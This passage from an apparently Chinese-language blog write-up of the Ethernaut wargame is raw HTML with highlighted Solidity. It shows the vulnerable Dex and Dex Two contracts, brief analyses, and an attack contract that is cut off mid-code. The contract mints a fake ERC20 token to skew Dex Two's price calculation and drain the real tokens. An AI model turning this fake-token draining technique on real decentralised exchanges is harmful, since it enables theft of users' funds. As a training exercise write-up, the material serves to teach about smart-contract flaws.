function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span> <span class=\"token operator\">==</span> token1 <span class=\"token operator\">&amp;&amp;</span> to <span class=\"token operator\">==</span> token2<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span> <span class=\"token operator\">==</span> token2 <span class=\"token operator\">&amp;&amp;</span> to <span class=\"token operator\">==</span> token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Invalid tokens\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough to swap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> swap_amount <span class=\"token operator\">=</span> <span class=\"token function\">get_swap_price</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> swap_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> swap_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">add_liquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token_address<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">get_swap_price</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">*</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">SwappableToken</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">SwappableToken</span><span class=\"token punctuation\">(</span>token2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SwappableToken</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> initialSupply<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-20\"><a href=\"#Analyze-20\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>这关没什么难度，只是比较繁琐，部署合约时候给了一定数量的token，换来换去知道取走所有即可</p>\n<h1 id=\"23-Dex-Two\"><a href=\"#23-Dex-Two\" class=\"headerlink\" title=\"23.Dex Two\"></a>23.Dex Two</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：As we’ve repeatedly seen, interaction between contracts can be a source of unexpected behavior.</p>\n<p>Just because a contract claims to implement the <a href=\"https://eips.ethereum.org/EIPS/eip-20\">ERC20 spec</a> does not mean it’s trust worthy.</p>\n<p>Some tokens deviate from the ERC20 spec by not returning a boolean value from their <code>transfer</code> methods. See <a href=\"https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca\">Missing return value bug - At least 130 tokens affected</a>.</p>\n<p>Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.</p>\n<p>If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.</p></blockquote>\n<h2 id=\"Code-22\"><a href=\"#Code-22\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">DexTwo</span>  <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token1<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token2<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _token2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    token1 <span class=\"token operator\">=</span> _token1<span class=\"token punctuation\">;</span>\n    token2 <span class=\"token operator\">=</span> _token2<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> amount<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough to swap\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> swap_amount <span class=\"token operator\">=</span> <span class=\"token function\">get_swap_amount</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> swap_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> swap_amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">add_liquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token_address<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">get_swap_amount</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>amount <span class=\"token operator\">*</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>to<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">/</span><span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> spender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">SwappableTokenTwo</span><span class=\"token punctuation\">(</span>token1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">SwappableTokenTwo</span><span class=\"token punctuation\">(</span>token2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span>spender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> account<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>account<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">SwappableTokenTwo</span> <span class=\"token keyword\">is</span> ERC20 <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> name<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> symbol<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token function\">ERC20</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> symbol<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_mint</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> initialSupply<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-21\"><a href=\"#Analyze-21\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>不同于Dex那道题，这道题可以自己选择token进行交换，所以伴随了一个漏洞，token_address可控，所以我们可以写一个代币自行构造IERC20(from).balanceOf(address(this)的数值，可以直接取走另一token。</p>\n<h2 id=\"Attack-19\"><a href=\"#Attack-19\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">DexTwo</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">swap</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">add_liquidity</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> token_address<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>token_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> _balanceOf<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> _allowances<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> owner<span class=\"token punctuation\">;</span>\n    DexTwo target<span class=\"token operator\">=</span><span class=\"token function\">DexTwo</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xa651bC1624316539cE6142f0355021f44c64D7b6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n        _balanceOf<span class=\"token punctuation\">[</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n        _balanceOf<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">18</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">transferFrom</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> sender<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> receipent<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        _balanceOf<span class=\"token punctuation\">[</span>sender<span class=\"token punctuation\">]</span><span class=\"token operator\">-=</span>amount<span class=\"token punctuation\">;</span>\n        _balanceOf<span class=\"token punctuation\">[</span>receipent<span class=\"token punctuation\">]</span><span class=\"token operator\">+=</span>amount<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> haver<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> _balanceOf<span class=\"token punctuation\">[</span>haver<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> ed<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">add_liquidity</span><span class=\"token punctuation\">(</span>ed<span class=\"token punctuation\">,</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> amount<span class=\"token 